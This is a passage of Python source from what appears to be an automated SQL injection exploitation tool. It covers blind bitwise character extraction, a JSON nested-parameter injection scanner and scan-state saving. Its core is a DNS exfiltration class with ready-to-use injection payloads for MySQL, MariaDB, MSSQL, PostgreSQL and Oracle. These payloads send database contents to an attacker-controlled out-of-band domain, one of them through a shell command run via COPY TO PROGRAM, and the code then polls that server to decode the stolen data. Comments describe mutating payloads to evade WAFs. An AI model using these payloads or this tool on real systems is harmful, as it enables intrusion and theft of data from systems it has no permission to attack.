        # PostgreSQL ASCII() returns full Unicode code points (0..U+10FFFF = 21 bits).
        # CockroachDB and YugabyteDB are PostgreSQL-compatible and share the same
        # ASCII() behaviour.  TiDB is MySQL-compatible and ORD() also returns
        # 0..U+10FFFF.  All four were missing from the `else 21` branch and fell
        # through to `else 8`.  With only 8 bit-probes, any character with code point
        # > 255 (Greek α=945, CJK 中=20013, emoji 😀=128512, currency €=8364 etc.)
        # had its upper bits silently dropped: only the low 8 bits were assembled,
        # producing a completely wrong character without any error or fallback.
        # Fix: add all four DBMSes to the `else 21` branch so the correct number of
        # bit-probes are fired and all code points up to U+10FFFF are extractable.
        # Numeric safety: _bwe_n_bits is a loop range bound (range(N)); it is never
        # placed inside SQL string delimiters or comparison operands.
        # Fix: determine the number of bits to probe from self._dbms:
        #   MSSQL/Sybase:                           16 bits → covers full BMP [0, 65535] via UNICODE()
        #   Oracle:                                 16 bits → covers full BMP [0, 65535] via CASE/ASCIISTR
        #                                                       (BUG-G FIX: was 8 bits → only 0-255 via ASCII())
        #   SQLite/MySQL/MariaDB/TiDB/              21 bits → covers full Unicode [0, 1,114,111]
        #     PostgreSQL/CockroachDB/YugabyteDB:
        #   Others:                                  8 bits → ASCII/ASCIISTR return 0-255
        # BUG-V139-BWE-AMZN-REDSHIFT-BITS FIX (HIGH, Amazon Redshift,
        # BitwiseExtractorSimple._extract_char_bits, all B/BH/IN/NV/WB techniques,
        # all surfaces, all HTTP methods):
        # Amazon Redshift was absent from the 21-bit branch and fell to else 8.
        # Redshift is PostgreSQL-wire-compatible; its ASCII() (the function selected
        # from CHAR_FUNCS) returns full Unicode code points (0..U+10FFFF = 21 bits).
        # With only 8 bit-probes, any Redshift character with code point > 255 has its
        # upper 13 bits silently dropped: actual 8364 (€, U+20AC) → extracted as
        # 8364 & 0xFF = 172 (¬) — completely wrong without any error or fallback.
        # TiDB, CockroachDB, and YugabyteDB were fixed (BUG-BWE-PG-TIDB-CRDB-YG-BITS
        # FIX) but Amazon Redshift was missed.
        # Numeric safety: _bwe_n_bits is a loop range bound (range(N)); it is never
        # placed inside SQL string delimiters or comparison operands.
        _bwe_n_bits = (16 if self._dbms in ("MSSQL", "Sybase", "Oracle")
                       else 21 if self._dbms in ("SQLite", "MySQL", "MariaDB",
                                                  "TiDB", "PostgreSQL",
                                                  "CockroachDB", "YugabyteDB",
                                                  "Amazon Redshift")  # BUG-V139-BWE-AMZN-REDSHIFT-BITS FIX
                       else 8)
        tasks = [_probe_bit(b) for b in range(_bwe_n_bits)]
        # BUG-7-FIX (Req 9): Throttle the asyncio.gather via module-level extraction semaphore.
        # Root-cause: asyncio.gather(*[_probe_bit(b) for b in range(8)]) launches 8 tasks
        # simultaneously. The per-instance _bit_sem (capped at min(max_parallel,4)) limits
        # CONCURRENT bit-probes per _extract_char_bits call. BUT when BitwiseBoolExtractor
        # (_extract_char_bits callers) is invoked in parallel (e.g. 2 outer extraction tasks
        # × 4 chars per batch × 8 bits = 64 bit-probe tasks firing simultaneously), the
        # per-instance semaphore only constrains within a single character extraction, NOT
        # across all parallel character extractions. The module-level _EXTRACTION_SEM_LIMIT=2
        # semaphore (enforced in _send_injected) is the correct back-pressure point.
        # _probe_bit already calls self._eval which calls _send_injected which acquires
        # the module semaphore — so this is already handled by the _send_injected path.
        # The additional fix here is to yield the event loop between gather task launches
        # so the scheduler can dispatch rate-limiter and semaphore callbacks between tasks.
        await asyncio.sleep(0.001)  # BUG-7-FIX: yield before gather to allow scheduler
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Assemble character from bits
        char_val = 0
        retry_bits = []
        for r in results:
            if isinstance(r, tuple):
                bit_n, bit_val = r
                if bit_val >= 0:
                    char_val |= (bit_val << bit_n)
                else:
                    retry_bits.append(bit_n)
            else:
                pass  # exception  already handled
        
        # Retry failed bits individually
        for bit_n in retry_bits:
            mask = 1 << bit_n
            try:
                # BUG-1B FIX: Same BITAND/BIN_AND dispatch as _probe_bit above.
                # Oracle/Firebird do not support & so we must use their native functions.
                # BUG-DB2-BITWISE-BWE FIX: DB2 also has no & operator; uses BITAND().
                if self._dbms == "Oracle":
                    _retry_cond = f"BITAND({_q},{mask})={mask}"
                elif self._dbms == "Firebird":
                    _retry_cond = f"BIN_AND({_q},{mask})={mask}"
                elif self._dbms in ("DB2",):
                    _retry_cond = f"BITAND({_q},{mask})={mask}"
                else:
                    _retry_cond = f"({_q})&{mask}={mask}"
                result = await self._eval(_retry_cond)
                # BUG-PROBE-BIT-RETRY-NONE-FIX: None means WAF block — keep bit as 0
                # (can't determine value; True is the only reliable signal).
                if result is True:
                    char_val |= mask
            except Exception:
                pass  # bit stays 0
        
        # FIX-EXTRACT-B: Old check `32 <= char_val <= 126` only covers printable ASCII.
        # MSSQL/SQLite use CHAR_RANGE up to 1114111 (full Unicode BMP + supplementary).
        # High code points (e.g. passwords with Unicode chars, non-Latin table names)
        # returned '?' silently. Now accept any valid Unicode code point (0x00-0x10FFFF)
        # and substitute printable representation; control chars rendered as '□'.
        if 0 <= char_val <= 0x10FFFF:
            try:
                _c = chr(char_val)
                # Return printable chars as-is; replace control chars with placeholder
                return _c if char_val >= 32 and char_val != 127 else '□'
            except (ValueError, OverflowError):
                return '?'
        return '?'


#  Feature 4: DNS Exfiltration Extraction 
class DNSExfilExtractor:
    """Extract data via DNS lookups  1 request per value.
    Requires OOB server (Burp Collaborator, interact.sh, custom DNS)."""
    
    EXFIL_PAYLOADS = {
        # BUG-DNSEXFIL-PAYLOADS FIX: Multiple bugs in original templates:
        # MySQL: HEX() returns UPPERCASE — polling validates lowercase; fix: LOWER(HEX(...))
        # MSSQL: EXEC('xp_dirtree "\\'+@x+...') fails — string concat inside EXEC() string
        #        Fix: proper DECLARE @h; SET @h=...; EXEC master..xp_dirtree @h
        # PostgreSQL: '||encode(...)...' is SQL concat inside a shell string — never evaluated
        #             Fix: dblink_connect triggers DNS without superuser + no shell string
        # Oracle: UTL_ENCODE.BASE64_ENCODE produces +/= chars invalid in DNS labels
        #         Fix: LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(...)))
        # BUG-DNSEXFIL-DNS-LABEL-LIMIT FIX: DNS labels are limited to 63 chars (31 hex bytes).
        # Values longer than 31 bytes (e.g. database version strings, SQL query results) produce
        # hex strings of 62+ chars that exceed the DNS label limit and are silently dropped.
        # Fix: add multi-chunk variants that split the hex output into multiple ≤62-char DNS
        # labels separated by dots. The polling code now concatenates consecutive hex labels,
        # so [chunk1].[chunk2].oast.pro decodes correctly.
        # Each DBMS entry now has: [short-value template, multi-chunk template].
        # Short-value (≤31 bytes): uses SUBSTR(...,1,31) for safety on single-label path.
        # Multi-chunk (any length): uses two labels of 62 hex chars each (covers ≤62 bytes).
        "MySQL": [
            # Short values ≤31 bytes — one DNS label
            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
            # Multi-chunk: bytes 1-31 in first label, bytes 32-62 in second label
            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),IF(LENGTH(({expr}))>31,LOWER(HEX(SUBSTR(({expr}),32,31))),CHAR(120)),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
            # Full value via LOAD_FILE (original, untruncated — works when value fits in one label)
            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92,92),LOWER(HEX(({expr}))),CHAR(46),'{domain}',CHAR(92,120)))-- -",
        ],
        "MariaDB": [
            # Short values ≤31 bytes — one DNS label
            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
            # Multi-chunk variant
            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),IF(LENGTH(({expr}))>31,LOWER(HEX(SUBSTR(({expr}),32,31))),CHAR(120)),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
        ],
        "MSSQL": [
            # Short values — MSSQL: chunk1 (bytes 1-31 in hex) as first label
            "'; DECLARE @_sqrd VARCHAR(999),@_sqrh VARCHAR(999);SET @_sqrd=LOWER(CONVERT(VARCHAR(62),CONVERT(VARBINARY(31),({expr})),2));SET @_sqrh=CHAR(92)+CHAR(92)+@_sqrd+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_dirtree @_sqrh-- -",
            # Multi-chunk: two labels with chunks 1-31 and 32-62 bytes
            "'; DECLARE @_sqrd VARCHAR(62),@_sqrd2 VARCHAR(62),@_sqrh VARCHAR(999),@_sqrfull VARBINARY(MAX);SET @_sqrfull=CONVERT(VARBINARY(MAX),({expr}));SET @_sqrd=LOWER(CONVERT(VARCHAR(62),SUBSTRING(@_sqrfull,1,31),2));SET @_sqrd2=LOWER(CONVERT(VARCHAR(62),SUBSTRING(@_sqrfull,32,31),2));SET @_sqrh=CHAR(92)+CHAR(92)+@_sqrd+CHAR(46)+@_sqrd2+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_dirtree @_sqrh-- -",
            # Fallback: xp_fileexist
            "'; DECLARE @_sqrd VARCHAR(999),@_sqrh VARCHAR(999);SET @_sqrd=LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expr})),2));SET @_sqrh=CHAR(92)+CHAR(92)+@_sqrd+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_fileexist @_sqrh-- -",
        ],
        "PostgreSQL": [
            # Short values ≤31 bytes — one label
            "'; SELECT dblink_connect($$host=$$||encode(SUBSTR(({expr})::bytea,1,31),$$hex$$)||$$.{domain} dbname=x connect_timeout=2$$)-- -",
            # Multi-chunk: two labels for values up to 62 bytes
            # BUG-PG-DBLINK-MULTICHUNK-SPACE FIX: The original template had $$. $$ (dot+space)
            # between the two hex chunks. libpq connection strings are space-delimited; an
            # unquoted space inside the host= value terminates the host field prematurely:
            #   host=<chunk1>.  <chunk2>.<domain>  →  host is parsed as "<chunk1>." only;
            #   ". <chunk2>..." is treated as an unknown key → dblink_connect fails with
            #   "invalid connection option" → DNS lookup never fires.
            # Fix: use $$.$$  (dot only, no space) so the two hex labels are joined by a
            # bare dot, producing a valid DNS FQDN: <chunk1>.<chunk2>.<domain>.
            "'; SELECT dblink_connect($$host=$$||encode(SUBSTR(({expr})::bytea,1,31),$$hex$$)||$$.$$||encode(SUBSTR(({expr})::bytea,32,31),$$hex$$)||$$.{domain} dbname=x connect_timeout=2$$)-- -",
            # Full value (original — works for short values)
            "'; COPY (SELECT encode(({expr})::bytea,$$hex$$)) TO PROGRAM $$xargs -I{{}} nslookup {{}}.{domain}$$-- -",
        ],
        "Oracle": [
            # Short values ≤31 bytes
            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({expr}),1,31))))||'.{domain}') FROM DUAL) IS NOT NULL-- -",
            # Multi-chunk: two labels for values up to 62 bytes
            "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({expr}),1,31))))||'.'||LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({expr}),32,31))))||'.{domain}') FROM DUAL) IS NOT NULL-- -",
            # HTTP fallback (original, untruncated)
            "' AND (SELECT UTL_HTTP.REQUEST('http://'||LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expr}))))||'.{domain}/') FROM DUAL) IS NOT NULL-- -",
        ],
    }

    HEX_EXPR = {
        # BUG-DNSEXFIL-HEXEXPR FIX: Oracle was using UTL_ENCODE.BASE64_ENCODE which
        # produces +/= characters — ALL invalid in DNS labels. Fix: LOWER(RAWTOHEX(...)).
        # MySQL: LOWER(HEX(...)) to ensure lowercase for polling hex validation.
        "MySQL":      "LOWER(HEX(({expr})))",
        "MariaDB":    "LOWER(HEX(({expr})))",
        "MSSQL":      "LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expr})),2))",
        "PostgreSQL": "encode(({expr})::bytea,$$hex$$)",
        "Oracle":     "LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expr}))))",
    }
    
    def __init__(self, engine, config, method, url, data, data_fmt, param, original,
                 dbms, tamper_chain, oob_domain=None):
        self._engine = engine
        self._config = config
        self._method = method
        self._url = url
        self._data = data
        self._data_fmt = data_fmt
        self._param = param
        self._original = original
        self._dbms = dbms
        self._tamper_chain = tamper_chain
        self._oob_domain = oob_domain or getattr(config, 'oob_server', '') or ''
    
    async def can_exfiltrate(self) -> bool:
        """Test if DNS exfiltration is possible."""
        if not self._oob_domain:
            return False
        templates = self.EXFIL_PAYLOADS.get(self._dbms, [])
        return len(templates) > 0
    
    async def extract_value(self, sql_expr: str) -> Optional[str]:
        """Extract a SQL expression value via DNS OOB callback, then poll OAST server.

        BUG-DNSEXFIL-NO-POLL FIX: Old code always returned "__DNS_EXFIL_SENT__" after
        sending the injection — it never polled the OAST server for the DNS callback
        data. The payload fires, DNS query arrives at OAST server, but the value is
        never retrieved. Now polls the OAST REST /poll endpoint for up to 15 seconds.

        BUG-DNSEXFIL-URL-AS-DOMAIN FIX: _oob_domain was set to the full URL value of
        config.oob_server (e.g. "https://oast.pro"). Using a URL as a DNS label in
        LOAD_FILE(CONCAT(...,"https://oast.pro",...)) produces an invalid UNC path.
        Fix: strip scheme/path to extract just the hostname.
        """
        if not self._oob_domain:
            return None

        # BUG-DNSEXFIL-WRONG-DOMAIN FIX + BUG-CALLBACK-HOST-URL FIX:
        # Prefer registered session domain; strip URL scheme from fallback.
        # BUG-REST-vs-DNS-DOMAIN FIX: Two separate domains:
        #   REST API server URL: config.oob_server (e.g. "https://oast.pro")
        #   DNS session domain:  config._oob_registered_domain (e.g. "sessionid.oast.fun")
        # Using the session domain as the REST API URL breaks polling — the session
        # domain is a DNS-only subdomain, not an HTTP endpoint.
        _raw_domain = self._oob_domain
        # REST API: always use the original oob_server base URL
        _oob_server_url = getattr(self._config, "oob_server", "") or ""
        if not _oob_server_url:
            # Fallback: try to reconstruct from _raw_domain if it has a scheme
            _oob_server_url = _raw_domain if "://" in _raw_domain else ("https://" + _raw_domain)
        # DNS domain: use registered session domain (stripped hostname only)
        _reg_domain_cfg = getattr(self._config, "_oob_registered_domain", None)
        if _reg_domain_cfg:
            _dns_domain = _reg_domain_cfg
        elif "://" in _raw_domain:
            _dns_domain = _raw_domain.split("://", 1)[-1].split("/")[0]
        else:
            _dns_domain = _raw_domain

        templates = self.EXFIL_PAYLOADS.get(self._dbms, [])
        if not templates:
            return None

        _hex_fn = self.HEX_EXPR.get(self._dbms, "LOWER(HEX((" + sql_expr + ")))")
        _oob_token = getattr(self._config, "oob_token", "") or ""

        for tpl in templates:
            payload = tpl.replace("{expr}", sql_expr)
            payload = payload.replace("{expr_hex}", _hex_fn.replace("{expr}", sql_expr))
            payload = payload.replace("{domain}", _dns_domain)

            # BUG-DNSEXFIL-MUTATION FIX (HIGH): DNS exfiltration payloads sent
            # without _bypass_mutation=True cause _send_injected_inner to apply
            # all 20 SQLMutationEngine layers. This breaks DNS payloads because:
            #   Layer 16 (mutate_stacked_payload): MSSQL payloads start with ';'
            #     and contain SELECT-less DECLARE...SET...EXEC chains. The stacked
            #     mutator injects ';SELECT 1' BETWEEN the statements, producing:
            #       '; DECLARE @x...; SELECT 1; SET @x=...; EXEC master...'
            #     breaking the T-SQL variable flow (variable declared but not set
            #     before EXEC because SELECT 1 resets context).
            #   Layer 8 (waf_bypass_string_manip): Splits string literals in CHAR()
            #     concatenations and domain strings — breaking CONCAT(CHAR(92),...)
            #     paths used in LOAD_FILE UNC paths.
            #   Layer 11 (apply_novel_bypass): c-comment keyword fragmentation on
            #     LOAD_FILE, DECLARE, EXECUTE, CONNECT etc. — all DBMSes except
            #     MySQL/MariaDB treat /**/ as whitespace, not nothing, fragmenting
            #     these keywords into invalid tokens.
            # Fix: pass _bypass_mutation=True so _send_injected_inner skips its
            # internal SQLMutationEngine.mutate_all() call. Apply safe whitespace/
            # comment-only obfuscation manually here BEFORE the send call (this
            # preserves WAF evasion without risking structural payload corruption).
            # Safe obfuscation: only rotate comment tokens and spaces — never rewrite
            # string literals, numeric literals, or structural SQL keywords.
            try:
                # Apply safe whitespace/comment-only obfuscation to the DNS payload.
                # Use SQLMutationEngine with extraction-safe layers (1-5, 10) only
                # by temporarily setting _EXTRACTION_ACTIVE so mutate_all() skips
                # all structurally-unsafe layers.
                _dns_obf_payload = payload
                try:
                    _dns_was_active = _EXTRACTION_ACTIVE[0]
                    _EXTRACTION_ACTIVE[0] = True   # limit to safe layers (1-5, 10)
                    _dns_sme = SQLMutationEngine(dbms=self._dbms, surface=self._data_fmt
                                                 if self._data_fmt in ("header", "json", "cookie", "xml")
                                                 else "url")
                    _dns_mut = _dns_sme.mutate_all(payload, technique="S")  # S=stacked, skips layer-8 string split
                    _EXTRACTION_ACTIVE[0] = _dns_was_active
                    # Only use the mutated form if it doesn't break the DNS domain
                    # or the structural markers (LOAD_FILE, xp_dirtree, dblink).
                    _dns_mut_upper = (_dns_mut or "").upper()
                    _payload_upper = payload.upper()
                    _dns_structural_ok = all(
                        mk in _dns_mut_upper
                        for mk in [m for m in ("LOAD_FILE", "XP_DIRTREE", "XP_FILEEXIST",
                                               "DBLINK_CONNECT", "UTL_INADDR", "UTL_HTTP",
                                               "RAWTOHEX", "COPY")
                                   if m in _payload_upper]
                    )
                    if _dns_mut and _dns_structural_ok and _dns_domain in _dns_mut:
                        _dns_obf_payload = _dns_mut
                except Exception:
                    pass  # safe obfuscation failed — use plain payload

                await _send_injected(self._engine, self._method, self._url,
                    self._data, self._data_fmt, self._param,
                    self._original + _dns_obf_payload, self._tamper_chain,
                    _bypass_mutation=True)  # FIX-DNSEXFIL-MUTATION: already obfuscated above
                print(f"[+] [DNSExfil] Sent probe for: {sql_expr[:40]!r}", flush=True)
            except Exception as _se:
                LOG.debug(f"[DNSExfil] Send error: {_se}")
                continue

            # Poll OAST server for the DNS callback (up to 15s)
            await asyncio.sleep(3.0)
            _deadline = time.monotonic() + 12.0
            _hdrs = {"Authorization": f"Bearer {_oob_token}"} if _oob_token else {}
            while time.monotonic() < _deadline:
                try:
                    # BUG-OAST-SESSION-ID FIX: use server session id
                    _dne_server_sid = getattr(self._config, "_oob_server_session_id", "") or ""
                    _dne_poll_id = (_dne_server_sid if _dne_server_sid else
                                    getattr(self._config, "_oob_registered_token", None) or
                                    _oob_token or "sqr")
                    _pfp = await self._engine.send(
                        "GET", f"{_oob_server_url.rstrip('/')}/poll",
                        params={"id": _dne_poll_id, "secret": _dne_poll_id},
                        headers=_hdrs)
                    if _validate_response(_pfp, func_name="DNSExfil.poll"):
                        # BUG-INLINE-IMPORT-JSON-DNE FIX (LOW): removed `import json as _json_dne`.
                        # json is already imported at module level (line 9745).
                        # Inline import adds unnecessary dict lookup on every poll iteration.
                        _body = _extract_body_safe(_pfp, func_name="DNSExfil.poll")
                        _body_s = _body.decode("utf-8", errors="replace") if isinstance(_body, bytes) else str(_body)
                        _pd = json.loads(_body_s)
                        for _itx in (_pd.get("data") or []):
                            # BUG-OOB-INTERACTION-STRING FIX: handle str items
                            if isinstance(_itx, str):
                                _fid = _itx
                            else:
                                _fid = (_itx.get("full-id") or _itx.get("unique-id") or
                                        _itx.get("subdomain") or _itx.get("hostname") or "")
                            if not _fid:
                                continue
                            # BUG-DNSEXFIL-CHUNKING FIX: DNS labels are limited to 63 chars
                            # (31 hex bytes per label). Values longer than 31 bytes are spread
                            # across multiple consecutive hex labels in the FQDN:
                            #   [chunk1].[chunk2].[chunk3].oast.pro
                            # Collect ALL consecutive leading hex-only labels and concatenate
                            # them before decoding. This covers both single-label (≤31 byte)
                            # values and multi-label (>31 byte) chunked extractions.
                            _fid_parts = _fid.split(".")
                            _hex_labels = []
                            for _fp_part in _fid_parts:
                                _fp_lower = _fp_part.lower()
                                if len(_fp_lower) >= 2 and all(c in "0123456789abcdef" for c in _fp_lower):
                                    _hex_labels.append(_fp_lower)
                                else:
                                    break  # stop at first non-hex label (domain components)
                            if not _hex_labels:
                                continue
                            _hex_combined = "".join(_hex_labels)
                            if len(_hex_combined) >= 4:
                                try:
                                    _raw_bytes = bytes.fromhex(_hex_combined)
                                    # BUG-MSSQL-UCS2-DECODE FIX: MSSQL NVARCHAR columns are
                                    # encoded as UCS-2 LE (2 bytes per char), so hex-encoding
                                    # produces null bytes every other position for ASCII text.
                                    # CONVERT(VARBINARY(MAX), nvarchar_col) preserves UCS-2 LE
                                    # encoding → b'\x61\x00\x62\x00\x63\x00' for "abc".
                                    # Decoding as UTF-8 produces "a\x00b\x00c\x00" (valid but
                                    # polluted with null bytes).
                                    # Fix: detect the UCS-2 LE null-byte interleave pattern
                                    # (every odd byte is 0x00 for BMP codepoints) and try
                                    # UTF-16-LE decoding first, then strip residual null bytes.
                                    _decoded = None
                                    _len_rb = len(_raw_bytes)
                                    _is_ucs2_le = (
                                        _len_rb >= 4
                                        and _len_rb % 2 == 0
                                        and all(_raw_bytes[i] == 0 for i in range(1, _len_rb, 2))
                                        and any(_raw_bytes[i] != 0 for i in range(0, _len_rb, 2))
                                    )
                                    if _is_ucs2_le:
                                        try:
                                            _decoded = _raw_bytes.decode("utf-16-le", errors="replace")
                                        except Exception:
                                            pass
                                    if _decoded is None:
                                        _decoded = _raw_bytes.decode("utf-8", errors="replace")
                                    # Strip embedded null bytes (residual UCS-2 LE artifact)
                                    # that remain after UTF-8 decode of MSSQL NVARCHAR data.
                                    if "\x00" in _decoded:
                                        _decoded = _decoded.replace("\x00", "")
                                    print(f"[+] [DNSExfil] ✓ Decoded: {_decoded!r}", flush=True)
                                    return _decoded
                                except Exception:
                                    pass
                except Exception as _pe:
                    LOG.debug(f"[DNSExfil] Poll error: {_pe}")
                await asyncio.sleep(2.0)

        return None
    
    async def extract_basic_info(self, queries: dict) -> dict:
        """Extract version/database/user via DNS exfiltration."""
        if not self._oob_domain:
            return {}
        results = {}
        for label, expr in queries.items():
            # BUG-DNSEXFIL-DISCARD-VALUE FIX (HIGH, all DBMSes, OOB extraction):
            # extract_value() returns the decoded DNS-exfiltrated string (e.g. "5.7.33-log")
            # or None on failure.  The old code stored f"[DNS exfil sent to ...]" instead
            # of the actual decoded value — discarding all extracted data and storing a
            # useless placeholder.  Downstream callers (schema enumeration, report output)
            # received the placeholder string as the "extracted" database version/user/etc.
            # Fix: store the returned value directly; keep the print for operator feedback.
            _val = await self.extract_value(expr)
            if _val:
                results[label] = _val
                print(f"[+] [DNSExfil] {label}: {_val!r}", flush=True)
        return results


#  Feature 5: JSON Deep Nesting Injection Scanner 
class JSONDeepNestingScanner:
    """Recursively test injection at every string value in nested JSON structures.
    Finds vulns in deeply nested API parameters that flat scanning misses."""
    
    def __init__(self, engine, config, session):
        self._engine = engine
        self._config = config
        self._session = session
    
    @staticmethod
    def _flatten_json(obj, prefix="", paths=None):
        """Recursively extract all (path, value) pairs from nested JSON."""
        if paths is None:
            paths = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                _path = f"{prefix}.{k}" if prefix else k
                if isinstance(v, str):
                    paths.append((_path, v))
                elif isinstance(v, (dict, list)):
                    JSONDeepNestingScanner._flatten_json(v, _path, paths)
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                _path = f"{prefix}[{i}]"
                if isinstance(v, str):
                    paths.append((_path, v))
                elif isinstance(v, (dict, list)):
                    JSONDeepNestingScanner._flatten_json(v, _path, paths)
        return paths
    
    @staticmethod
    def _set_nested(obj, path: str, value):
        """Set a value at a nested JSON path like 'user.profile.bio' or 'items[0].name'."""
        import copy
        obj = copy.deepcopy(obj)
        parts = re.split(r'\.|\[(\d+)\]', path)
        parts = [p for p in parts if p is not None and p != '']
        
        current = obj
        for i, part in enumerate(parts[:-1]):
            if part.isdigit():
                current = current[int(part)]
            else:
                current = current[part]
        
        last = parts[-1]
        if last.isdigit():
            current[int(last)] = value
        else:
            current[last] = value
        return obj
    
    async def scan(self, method: str, url: str, json_body: dict,
                    tamper_chain: list, waf_name: str = "") -> list:
        """Scan all nested string values in a JSON body for SQL injection."""
        results = []
        paths = self._flatten_json(json_body)
        
        if not paths:
            return results
        
        print(f"[*] [JSONDeep] Found {len(paths)} injectable string values in nested JSON", flush=True)
        
        # Get baseline
        try:
            _bl_fp = await asyncio.wait_for(
                self._engine.send(method, url, json_body=json_body), timeout=15)
            _bl_status = _bl_fp.status_code if _bl_fp else 200
            _bl_body = _bl_fp.body if _bl_fp and _bl_fp.body else b""
        except Exception:
            return results
        
        # Quick probes for each nested path
        _probes = [
            ("'", "quote"),
            ("' OR '1'='1", "boolean"),
            ("' AND SLEEP(0)-- -", "timing_safe"),
        ]
        
        for json_path, original_val in paths:
            _hits = 0
            for probe_val, probe_name in _probes:
                try:
                    _injected = self._set_nested(json_body, json_path, original_val + probe_val)
                    _fp = await asyncio.wait_for(
                        self._engine.send(method, url, json_body=_injected), timeout=15)
                    if _fp:
                        # Check for SQL errors
                        _body = _safe_decode_body(_fp, encoding="utf-8", errors="replace", func_name="extraction").lower() if _fp.body else ""
                        _has_err = any(p in _body for p in [
                            "sql", "syntax error", "you have an error",
                            "ora-0", "incorrect syntax", "unterminated"])
                        _status_diff = _get_safe_status_code(_fp) != _bl_status
                        _body_diff = False
                        if _bl_body and _fp.body:
                            _norm_bl = ResponseNormaliser.normalise(_bl_body)
                            _norm_fp = ResponseNormaliser.normalise(_extract_body_safe(_fp)) if _validate_response(_fp, allow_empty=True) else b""
                            _sim = SimHasher.body_similarity(_norm_bl, _norm_fp)
                            _body_diff = _sim < 0.90
                        
                        if _has_err or (_status_diff and _get_safe_status_code(_fp) >= 500):
                            _hits += 2  # strong signal
                        elif _body_diff or _status_diff:
                            _hits += 1  # weak signal
                except Exception:
                    pass
            
            if _hits >= 2:
                print(f"[+] [JSONDeep] {json_path}  SQL injection likely "
                      f"(score={_hits}/6)", flush=True)
                results.append({
                    "path": json_path,
                    "original": original_val,
                    "score": _hits,
                    "param": f"json:{json_path}",
                })
            elif _hits == 1:
                print(f"[*] [JSONDeep] {json_path}  weak signal (score={_hits}/6)", flush=True)
        
        if not results:
            print(f"[*] [JSONDeep] No nested injection found in {len(paths)} paths", flush=True)
        
        return results


# 
# SESSION 3 ENHANCEMENTS (1-10)  POLISHED VERSIONS
# 

#  1. Session Save/Resume (enhanced: signal handler, periodic save, full state) 
class ScanSessionPersistence:
    """Save/restore scan state for resume on crash or Ctrl+C."""
    
    def __init__(self, output_dir: str = "output"):
        self._path = os.path.join(output_dir, "scan_session.json")
        self._state = {}
        self._save_interval = 60  # periodic save every 60s
        self._last_save = 0.0
        # Install Ctrl+C handler for graceful save
        self._orig_handler = None
        try:
            import signal
            self._orig_handler = signal.getsignal(signal.SIGINT)
            def _graceful_exit(signum, frame):
                print("\n[!] [Session] Ctrl+C  saving scan state before exit...", flush=True)
                try:
                    self._sync_save()
                    print(f"[+] [Session] State saved to {self._path}  resume with same command", flush=True)
                except Exception:
                    pass
                if self._orig_handler and callable(self._orig_handler):
                    self._orig_handler(signum, frame)
                else:
                    raise KeyboardInterrupt
            signal.signal(signal.SIGINT, _graceful_exit)
        except Exception:
            pass
    
    def _sync_save(self):
        """Synchronous save for signal handlers."""
        if self._state:
            try:
                os.makedirs(os.path.dirname(self._path) or ".", exist_ok=True)
                # TODO: Replace with aiofiles for async I/O
                with open(self._path, "w") as f:
                    json.dump(self._state, f, indent=2, default=str)
            except Exception:
                pass
    
    def save(self, state: dict):
        """Save scan state to disk."""
        try:
            os.makedirs(os.path.dirname(self._path) or ".", exist_ok=True)
            _serializable = {}
            for k, v in state.items():
                if isinstance(v, (str, int, float, bool, list, dict, type(None))):
                    _serializable[k] = v
                elif hasattr(v, '__dict__'):
                    _serializable[k] = str(v)
            _serializable["_saved_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
            self._state = _serializable
            # TODO: Replace with aiofiles for async I/O
            with open(self._path, "w") as f:
                json.dump(_serializable, f, indent=2, default=str)
            self._last_save = time.monotonic()
        except Exception as e:
            LOG.debug(f"Session save error: {e}")
    
    def should_periodic_save(self) -> bool:
        """Check if enough time passed for periodic save."""
        return time.monotonic() - self._last_save > self._save_interval
    
    def load(self) -> dict:
        """Load previous scan state if it exists."""
        try:
            if os.path.exists(self._path):
                # TODO: Replace with aiofiles for async I/O
                with open(self._path, "r") as f:
                    self._state = json.load(f)
                return self._state
        except Exception as e:
            LOG.debug(f"Session load error: {e}")
        return {}
    
    def clear(self):
        try:
            if os.path.exists(self._path):
                os.remove(self._path)
        except Exception:
            pass
    
    def has_saved_session(self) -> bool:
        return os.path.exists(self._path)


#  2. Parallel Character Extraction (enhanced: interpolation, frequency, retry) 
class ParallelCharExtractor:
    """Extract multiple character positions simultaneously with smart search."""
    
    # Character frequency table  search most likely values first
    CHAR_FREQ = {ord(c): i for i, c in enumerate(
        "etaoinshrdlcumwfgypbvkjxqz0123456789_-.@/ ETAOINSHRDLCUMWFGYPBVKJXQZ")}
    
    def __init__(self, engine, config, eval_fn, max_parallel: int = 4):
        self._engine = engine
        self._config = config
        self._eval_fn = eval_fn
        self._max_parallel = max_parallel
        self._gate = _ACTIVE_GATE[0] if _ACTIVE_GATE[0] else None
    
    async def extract_string(self, length_query: str, char_query_template: str,
                              max_length: int = 128) -> str:
